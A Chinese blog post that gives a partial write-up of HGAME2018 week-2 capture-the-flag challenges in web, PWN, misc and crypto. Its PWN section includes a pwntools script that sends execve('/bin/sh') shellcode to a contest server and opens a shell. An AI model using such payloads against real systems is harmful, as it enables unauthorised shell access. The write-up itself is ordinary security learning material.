<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <!-- viewport-fit=cover is to support iPhone X rounded corners and notch in landscape-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=10, viewport-fit=cover">

      <title>LuckyDog | CSUwangj&#x27;s Blog</title>

      <!-- CSS -->
      <link rel="stylesheet" href="https://CSUwangj.github.io/css/lib/font-awesome.min.css">
      <link rel="stylesheet" href="https://CSUwangj.github.io/site.css">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Alegreya+Sans|Noto+Serif+SC">
      
<link rel="stylesheet" href="https://CSUwangj.github.io/custom.css">

      <!-- js -->
      <script type="text/javascript" charset="utf-8" src="https://CSUwangj.github.io/js/sidebar.js"></script>
      

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css" crossorigin="anonymous">
<script type="module">
import renderMathInElement from "https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.mjs";
const katex_config = {
  delimiters: [
    { left: "$$", right: "$$", display: true },
    { left: "$", right: "$", display: false },
  ],
  macros: {
    // Functions
    arccot: '\\operatorname{arccot}',
    arcsec: '\\operatorname{arcsec}',
    arccsc: '\\operatorname{arccsc}',
  }
}
renderMathInElement(document.body, katex_config);
</script>


      

      
        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
      

      
      
    </head>

    <body>
      
      
        <header name="header">
          <div>
            <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;">LuckyDog</a></div>
            <nav class="menu">
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;" class="nav-item-home unselectable">
                  <span><i class="fa fa-home"></i> Home</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about unselectable">
                  <span><i class="fa fa-user-circle-o"></i> About</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories unselectable">
                  <span><i class="fa fa-book"></i> Categories</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags unselectable">
                  <span><i class="fa fa-tags"></i> Tags</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives unselectable">
                  <span><i class="fa fa-inbox"></i> Archives</span>
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;ZDaily" class="nav-item-dailychallenge unselectable">
                  <span><i class="fa fa-calendar-check-o"></i> DailyChallenge</span>
                </a>
              
              
            </nav>
          </div>
        </header>
      

      <main class="content container" name="main">
        <div class="content-wrapper">
          
  <div class="post">
    <h1 class="post-title">HGAME2018-week2部分WP</h1>
    <div class="post-meta">
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span>
        <span class="post-date">Posted on: </span>
        <time datetime=2018-02-16T16:00:20+08:00 title="post created">2018-02-16</time>
      
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span>
        <span class="modify-date">Posted modified: </span>
        <time datetime=2020-08-07T01:48:37.557765+08:00 title="post modified">2020-08-07</time>
      
      
        <span class="post-meta-divider">|</span>
        <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span>
        <span class="in-category">In: </span>
          
            <a class="category" href="/category/WriteUp">WriteUp</a>
          
      
      <span class="post-meta-divider">|</span>
    </div>
    <div class="post-body">
      <p>菜鸟每天飞过</p>
<span id="continue-reading"></span>
<ul>
<li>Web
<ul>
<li><input disabled="" type="checkbox" checked=""/>
Random?</li>
<li><input disabled="" type="checkbox" checked=""/>
草莓社区-1</li>
<li><input disabled="" type="checkbox" checked=""/>
草莓社区-2</li>
<li><input disabled="" type="checkbox"/>
XSS-1</li>
<li><input disabled="" type="checkbox"/>
XSS-2</li>
<li><input disabled="" type="checkbox"/>
最简单的sql题</li>
</ul>
</li>
<li>Rev
<ul>
<li><input disabled="" type="checkbox"/>
wtfitis</li>
<li><input disabled="" type="checkbox"/>
miaomiaowu</li>
<li><input disabled="" type="checkbox"/>
iccanobif</li>
</ul>
</li>
<li>PWN
<ul>
<li><input disabled="" type="checkbox" checked=""/>
ez_shellcode</li>
<li><input disabled="" type="checkbox" checked=""/>
ez bash jail</li>
<li><input disabled="" type="checkbox"/>
hacker_system_ver1</li>
<li><input disabled="" type="checkbox"/>
ez_shellcode_ver2</li>
</ul>
</li>
<li>Misc
<ul>
<li><input disabled="" type="checkbox" checked=""/>
咻咻咻</li>
<li><input disabled="" type="checkbox" checked=""/>
White cosmos</li>
<li><input disabled="" type="checkbox" checked=""/>
easy password</li>
<li><input disabled="" type="checkbox" checked=""/>
mysterious file header</li>
</ul>
</li>
<li>Crypto
<ul>
<li><input disabled="" type="checkbox" checked=""/>
easy rsa</li>
<li><input disabled="" type="checkbox" checked=""/>
the same simple RSA</li>
<li><input disabled="" type="checkbox"/>
xasr</li>
<li><input disabled="" type="checkbox" checked=""/>
Caesar&amp;&amp;Caesar</li>
<li><input disabled="" type="checkbox" checked=""/>
violence</li>
</ul>
</li>
</ul>
<p>所以我到底是啥呢？想了想，应该是Web瞎做，Bin乱搞，其他RP选手……</p>
<h1 id="web">Web</h1>
<h2 id="random">Random?</h2>
<p>首先都提示了vim改代码，那就是源码泄露咯</p>
<p>试了一下是<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_175026.png" alt="Random1" /></p>
<p>用vim读一下<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_175201.png" alt="Random2" /></p>
<p>这里的方法是构造一个对象使public和secret公用空间，方法是<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_180251.png" alt="Random3" /></p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_180245.png" alt="Random4" /></p>
<h2 id="cao-mei-she-qu-1">草莓社区-1</h2>
<p>LFI嘛，最简单的肯定是直接来咯</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_171633.png" alt="草莓社区-1" /></p>
<h2 id="cao-mei-she-qu-2">草莓社区-2</h2>
<p>难一点的就用base64编码读咯</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_172618.png" alt="草莓社区-2_1" /></p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180213_172626.png" alt="草莓社区-2_2" /></p>
<h1 id="pwn">PWN</h1>
<h2 id="ez-shellcode">ez_shellcode</h2>
<p>既然是直接执行，那找一个就好了</p>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pwn import *
r = remote(&quot;111.230.149.72&quot;,10004)
print r.recv
payload = &quot;\x6a\x0b&quot;+&quot;\x58&quot;+&quot;\x99&quot;+&quot;\x52&quot;+&quot;\x68\x2f\x2f\x73\x68&quot;+&quot;\x68\x2f\x62\x69\x6e&quot;+&quot;\x89\xe3&quot;+&quot;\x52&quot; +&quot;\x53&quot;+&quot;\x89\xe1&quot;+&quot;\xcd\x80&quot;
r.send(payload)
r.interactive()
</code></pre>
<h2 id="ez-bash-jail">ez bash jail</h2>
<p>根据视频教程</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180214_171547.png" alt="ez bash jail" /></p>
<h1 id="misc">Misc</h1>
<h2 id="xiu-xiu-xiu">咻咻咻</h2>
<p>首先是一个zip伪加密<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_211448.png" alt="咻咻咻1" /></p>
<p>解压出来以后按照https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/用Ruby来解码</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_203651.png" alt="咻咻咻2" /></p>
<p>明显是Base64，解码得flag</p>
<h2 id="white-cosmos">White cosmos</h2>
<p>PWNHUB密码学专场里的签到题的套路</p>
<p>打开一看0x09/0x20心里就有底了<img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_204814.png" alt="white cosmos1" /></p>
<p>因为可见字符首位应该是0，所以0x09对应0，0x20对应1</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_205356.png" alt="white cosmos2" /></p>
<h2 id="easy-password">easy password</h2>
<p>没什么好说的，跑就是了</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_210003.png" alt="easy password" /></p>
<h2 id="mysterious-file-header">mysterious file header</h2>
<p>首先是zip包把前四字节做了一下调整，还是比较明显的，改正常以后解压就行</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_222543.png" alt="mysterious file header1" /></p>
<p>解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下</p>
<p>有用的代码为</p>
<pre data-lang="java" class="language-java "><code class="language-java" data-lang="java">&#x2F;*
 * Decompiled with CFR 0_123.
 *&#x2F;
package GUI;

import java.awt.Component;
import java.awt.GridLayout;
import java.awt.LayoutManager;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextArea;

public class hgameGUI
        extends JFrame {
    private static final int DEFAULT_WIDTH = 300;
    private static final int DEFAULT_HEIGHT = 200;

    public hgameGUI() {
        super(&quot;Welcome to Hgame!&quot;);
        this.setSize(300, 200);
        JButton flag1 = new JButton(&quot;i&#x27;m flag&quot;);
        JButton flag2 = new JButton(&quot;i&#x27;m flag, too.&quot;);
        JButton flag3 = new JButton(&quot;RU kidding me? I&#x27;m the true flag!&quot;);
        JButton flag4 = new JButton(&quot;UR wrong, I&#x27;m the true flag!&quot;);
        JTextArea flagtext = new JTextArea(&quot;Want flag? Try upstairs.&quot;);
        JPanel flag = new JPanel();
        flag.setLayout(new GridLayout(5, 1));
        flag.add(flag1);
        flag.add(flag2);
        flag.add(flag3);
        flag.add(flag4);
        flag.add(flagtext);
        flag1.addActionListener(event -&gt; {
                    flagtext.setText(&quot;118&quot;);
                }
        );
        flag2.addActionListener(event -&gt; {
                    flagtext.setText(&quot;54&quot;);
                }
        );
        flag3.addActionListener(event -&gt; {
                    flagtext.setText(&quot;29&quot;);
                }
        );
        flag4.addActionListener(event -&gt; {
                    flagtext.setText(&quot;89&quot;);
                }
        );
        this.add(flag);
    }
}
</code></pre>
<p>智障的我反应了半天才明白这是IP地址</p>
<p>遍历一下顺序查一下，在中国的一个IP里找到</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_211411.png" alt="mysterious file header2" /></p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_211452.png" alt="mysterious file header3" /></p>
<h1 id="crypto">Crypto</h1>
<h2 id="easy-rsa">easy rsa</h2>
<p>明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ</p>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">N = 10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
e = 65537
c = 4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
h = 211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750

low = 1
high = h&#x2F;&#x2F;2 
mid =int((low+high))&#x2F;&#x2F;2

while low&lt;high:
	if low*(h-low)  &gt; N:
		high = mid-1
	else:
		low = mid + 1
	mid = (low+high)&#x2F;&#x2F;2

print(low)
print(h-low)
</code></pre>
<p>这样就有p/q了</p>
<p>后来发现这出题人一开始应该没这样想</p>
<p>回头补……</p>
<h2 id="the-same-simple-rsa">The same simple RSA</h2>
<p>先读一下key咯</p>
<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">$ openssl rsa -pubin -in pubkey.pem -text -modulus
Public-Key: (256 bit)
Modulus:
    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
    be:30:dd
Exponent: 65537 (0x10001)
Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ&#x2F;+5erCQKPGqxsC&#x2F;bNPXDr
yigb&#x2F;+l&#x2F;vjDdAgMBAAE=
-----END PUBLIC KEY-----
writing RSA key

</code></pre>
<p>256位嘛，好说了</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180212_150022.png" alt="The same simple RSA" /></p>
<p>然后用rsatool生成pem文件，解密得flag</p>
<p>需要注意的是有了q/p也不能直接解密，这是使用了openssl的缘故（具体的我还没了解过</p>
<h2 id="caesar-caesar">Caesar&amp;&amp;Caesar</h2>
<p>直接在线解咯</p>
<p>要分析的话，就是指数重叠+频率分析？</p>
<h2 id="violence">violence</h2>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">a = &quot;191709050607090519_0706_0603150519_03_0a0706_170c_1407170205101105&quot;
a = a.replace(&#x27;_&#x27;,&#x27;&#x27;)
str = &quot;&quot;
for i in range(0,int(len(a)&#x2F;2)):
	str+=chr(ord(&#x27;a&#x27;)+int(a[2*i]+a[2*i+1],16))
print(str)
</code></pre>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from pycipher import Affine

s = [1,3,5,7,9,11,15,17,19,21,23,25]
for i in s:
	for j in range(0,25):
		print(Affine(a=i,b=j).encipher(&#x27;zxjfghjfzhggdvfzdkhgxmuhxcfqrf&#x27;).lower())
</code></pre>
<p>然后找到</p>
<p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180211_220623.png" alt="violence" /></p>

    </div>
  </div>

        </div>

        
          <button class="sidebar-toggle" onclick="openSidebar()">O</button>
          <aside class="sidebar" name="sidebar">
            <div class="site-author" itemprop="author" itemtype="https://schema.org/Person">
              
              <img class="site-author-image" itemprop="image"
                src="https://CSUwangj.github.io/images/avatar.png"
                alt="CSUwangj" />
              
              <p class="site-author-name unselectable">CSUwangj</p>
              <p class="site-author-quote">Just keep in mind that hacking is very rarely in a sequence.</p>
            </div>
            <div class="feed-link">
              
                <a rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
                  RSS
                </a>
              
            </div>
            <div class="links-of-author">
              
                <a href="https:&#x2F;&#x2F;github.com&#x2F;CSUwangj" title="Github" class="author-link">
                  <i class="fa fw fa-github"></i>
                </a>
              
                <a href="mailto:CSUwangj@protonmail.com" title="EMail" class="author-link">
                  <i class="fa fw fa-envelope"></i>
                </a>
              
            </div>
            <div class="links-of-blogroll">
              
                <a href="https:&#x2F;&#x2F;wolfbolin.com&#x2F;">WolfBolin</a>
              
                <a href="https:&#x2F;&#x2F;haolovej.com&#x2F;">bocity</a>
              
                <a href="https:&#x2F;&#x2F;blog.yuki-nagato.com&#x2F;">长门有希</a>
              
                <a href="http:&#x2F;&#x2F;www.porlockz.com&#x2F;">Porlockz</a>
              
                <a href="https:&#x2F;&#x2F;zickshen.github.io&#x2F;">ZickShen</a>
              
            </div>
          </aside>
        

      </main>

      
        <footer name="footer">
          <div class="copyright">
            <span item="copyrightYear">© 2018-2022</span>
            <span class="author">CSUwangj</span>
          </div>
          <div class="powered-by">
            Powered by <a href="https://www.getzola.org/">Zola</a> Theme <a href="https://github.com/CSUwangj/DogFood">DogFood</a>
          </div>
        </footer>
      
    </body>

</html>